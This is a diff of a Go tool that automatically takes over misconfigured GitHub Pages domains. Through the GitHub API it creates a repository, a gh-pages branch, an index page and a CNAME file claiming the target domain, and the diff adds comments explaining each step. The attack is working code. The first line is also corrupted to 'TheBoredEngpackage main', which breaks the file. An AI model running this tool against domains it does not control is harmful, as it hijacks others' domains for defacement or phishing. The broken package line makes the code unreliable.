@@ -1,4 +1,4 @@
-package main
+TheBoredEngpackage main
 
 import (
 	"bufio"
@@ -97,6 +97,10 @@ func check(domain string) string {
 
 func githubcreate(domain string) string {
 
+	fmt.Println("Found: Misconfigured Github Page at " + domain)
+	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")
+
+	// Connecting to your Github account using the Personal Access Token
 	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: os.Getenv("token")})
 	tc := oauth2.NewClient(oauth2.NoContext, ts)
 	client := github.NewClient(tc)
@@ -108,6 +112,7 @@ func githubcreate(domain string) string {
 		LicenseTemplate: github.String("mit"),
 	}
 
+	// Creating a repo
 	repocreate, _, err := client.Repositories.Create("", repo)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
@@ -118,6 +123,7 @@ func githubcreate(domain string) string {
 	refURL := *repocreate.URL
 	ref := "refs/heads/master"
 
+	// Retrieving the SHA value of the head branch
 	SHAvalue, _, err := client.Repositories.GetCommitSHA1(ownername, reponame, ref, "")
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
@@ -131,6 +137,7 @@ func githubcreate(domain string) string {
 		},
 	}
 
+	// Creating the gh-pages branch using the SHA value obtained above
 	newref, _, err := client.Git.CreateRef(ownername, reponame, opt)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
@@ -146,6 +153,7 @@ func githubcreate(domain string) string {
 		Branch:  github.String("gh-pages"),
 	}
 
+	// Creating the index file with the text you want to see when the domain is taken over
 	newfile1, _, err := client.Repositories.CreateFile(ownername, reponame, Indexpath, indexfile)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
@@ -157,13 +165,12 @@ func githubcreate(domain string) string {
 		Branch:  github.String("gh-pages"),
 	}
 
+	// Creating the CNAME file with the domain that needs to be taken over
 	newfile2, _, err := client.Repositories.CreateFile(ownername, reponame, CNAMEpath, cnamefile)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
 	}
 
-	fmt.Println("Found: Misconfigured Github Page at " + domain)
-	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")
 	fmt.Println("Branch created at " + *newref.URL)
 	fmt.Println("Index File created at " + *newfile1.URL)
 	fmt.Println("CNAME file created at " + *newfile2.URL)
